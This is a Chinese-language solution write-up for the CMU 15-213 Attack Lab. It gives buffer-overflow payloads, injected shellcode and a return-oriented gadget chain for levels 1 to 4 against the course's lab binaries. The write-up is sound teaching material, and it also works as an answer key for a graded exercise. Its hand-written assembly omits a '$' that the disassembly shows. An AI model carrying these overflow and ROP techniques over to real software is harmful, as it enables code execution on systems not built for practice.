# CMU 15213 Attack Lab

整体背景是我们有一个 `read_and_process_line` 函数，这个函数开辟了一个数组，然后读取用户的输入。然而这个函数并没有对用户输入的长度进行任何的限制，这就导致了用户如果输入一个非常长的字符串，可以造成 buffer overflow！

---

# Level 1

在 Level 1 中，我们需要攻击 `ctarget`，我们的目的是从 `read_and_process_line` 返回后，直接调用 `touch1` 函数

首先，我们查看 `touch1` 函数的地址 `0000000000402b9c`

其次，我们 disas test 和 disas read_and_process_line

```nasm
b test
b *0x0000000000402c8f
b read_and_process_line

run -i raw
```

首先到断点2处，这是我们进入 read_and_process_line 前的状态，此时如果我们 `display/x $rsp`，会显示 `0x5561e638`

然后就会执行 `sub $0x8,%rsp` , $rsp 变成 `0x5561e630` （这一步应该是为 test 函数分配 stack frame 空间）

然后就进入到了 `read_and_process_line` 函数中，这个时候看到 $rsp 变成 `0x5561e628`了！

`display/x *(0x5561e628)`会看到 0x402c99，这是 test 函数中调用完 read_and_process_line 的代码位置，就是说 628 ~ 630 这 8 bytes 占据了 return address → **也就是我们要攻击的 address**

在 read_and_process_line 函数中

首先是两行 push 函数，然后是一行 `sub $0x38,%rsp`

经过这三行后，$rsp 变成了 `0x5561e5e0`

至此，rsp 的变动就结束了，后续就很明了啦～

```nasm
01 00 00 00 00 00 00 00 // 0x5561e5e0
00 00 00 00 00 00 00 00 
02 00 00 00 00 00 00 00 // 0x5561e5f0
00 00 00 00 00 00 00 00 
03 00 00 00 00 00 00 00 // 0x5561e600
00 00 00 00 00 00 00 00 
04 00 00 00 00 00 00 00 // 0x5561e610
00 00 00 00 00 00 00 00 
05 00 00 00 00 00 00 00 // 0x5561e620
9c 2b 40 00             // 0x5561e628 ~ 0x5561e62b
```

---

# Level 2

在 Level 2 中，我们的任务是触发 touch2 函数，除此以外，我们需要将我们的 cookie `0x11560ebd`作为入参传递给 touch2 函数

这里，我们需要理解一下 PC 和 ret 指令：

- PC 即程序计数器，它时刻指向下一条需要执行的指令的地址，一般表示为 %rip
- ret 指令相当于 pop %rip, 即把栈中存放的地址弹出作为下一条指令的地址

因此，我们可以

1. 将我们的攻击代码写入 stack 中，这个攻击代码会将 cookie 写入到 $rdi 中，然后将 touch2 函数的地址放入栈中，最后 return —— 则会让 PC 读到 touch2 的地址
2. 覆盖原本的 return address 为我们的攻击代码的地址

首先，整个函数的 stack 结构其实都没有变，关键在于我们需要在输入中加上 executable code 来把我们的 cookie 丢到 rdi 寄存器中，我们可以先写出汇编代码

```nasm
mov 0x11560ebd,%rdi
pushq $0x402bd0
ret
```

通过 

`gcc -c example.s`

`objdump -d example.o > example.d` 我们得到了这两段代码的汇编形式

```nasm
test.o:     file format elf64-x86-64

Disassembly of section .text:

0000000000000000 <.text>:
   0:	48 c7 c7 bd 0e 56 11 	mov    $0x11560ebd,%rdi
   7:	68 d0 2b 40 00       	push   $0x402bd0
   c:	c3                   	ret
```

然后，记得我们之前标注的，在 read_and_process_line 中，rsp 指向 0x5561e5e0，这也是我们攻击代码注入的地址，于是有了如下的答案

```nasm
48 c7 c7 bd 0e 56 11 68
d0 2b 40 00 c3 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
e0 e5 61 55
```

---

# Level 3

这题的要求是我们触发 touch3 并且传入 cookie 的 ascii 表示，然后加了一个限制，就是我们不能把我们的 string 写入到 read_and_process_line 的 stack 中

本质上没有任何区别，我们将 cookie 存储到 test 函数的 stack 中，然后修改一下我们要注入的汇编代码即可

```nasm
mov $0x5561e638,%rdi
pushq $0x402c25
ret
```

```nasm
48 c7 c7 38 e6 61 55 68 # 0x5561e5e0
25 2c 40 00 c3 00 00 00
00 00 00 00 00 00 00 00 # 0x5561e5f0
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 # 0x5561e600
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
e0 e5 61 55 00 00 00 00 
00 00 00 00 00 00 00 00 
31 31 35 36 30 65 62 64
00 00 00 00 00 00 00 00 # 因为 hexmatch 中还有相关的逻辑，所以这里要填充 0
```

---

# Level 4

从这一部分开始，我们就要攻击 rtarget 了，这比前面的攻击要更加困难了，因为我们增加了栈随机 + 不可执行 stack 的内容 两个防护机制

因此，我们只能选择使用 gadget 来辅助我们的攻击

那么使用 gadget 有什么要考虑的呢？

- 首先想好我们要使用什么汇编代码，这样才能知道我们需要获取哪些 gadget
- 其次，同一个 gadget 指令，例如 `48 89 c7`，可能出现了很多次，是否每一处都可以满足我们的要求呢？ —— 答案是否定的，必须要以 nop 结尾的，才可以满足我们的要求。例如 `48 89 c7 90`

Level 4 要我们在 rtarget 中重复 Level 2 的攻击，那我们还是先写汇编代码

```nasm
mov 0x11560ebd,%rdi
pushq $0x402bd0
ret
```

坏了，我们的代码里面有一个 cookie 立即数，几乎不可能从 farm 中找到一段可以满足的代码，那我们怎么办呢？

首先考虑将 cookie 放入到栈中，然后 `pop D` 指令可以将当前 rsp 所指向的数据赋值给 D，因此如下汇编代码就可以把 cookie 赋值给 rdi，然后执行 touch2 即可

```nasm
pop %rdi
ret
```

这个操作对应的汇编指令是 5f，然而在 farm 中找不到，于是只能选择加一个 gadget 帮忙中转

```nasm
popq %rax // 58
ret
###############
movq %rax, %rdi // 48 89 c7
ret
```

```nasm
0000000000402cca <setval_123>:
  402cca:	c7 07 08 58 90 90    	movl   $0x90905808,(%rdi)
  402cd0:	c3
```

402ccd 包含了我们需要的 58 90

```nasm
0000000000402cbc <setval_137>:
  402cbc:	c7 07 48 89 c7 90    	movl   $0x90c78948,(%rdi)
  402cc2:	c3
```

402cbe 包含了我们需要的 48 89 c7


```nasm
00 00 00 00 00 00 00 00 # 0x5561e5e0 ～ 5ef
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 # 0x5561e5f0
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 # 0x5561e600
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 # 0x5561e610
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 # 0x5561e620 ~ 627
cd 2c 40 00 00 00 00 00
bd 0e 56 11 00 00 00 00 # 0x5561e630 (Cookie)
be 2c 40 00 00 00 00 00
d0 2b 40 00 00 00 00 00 # touch2 Address
```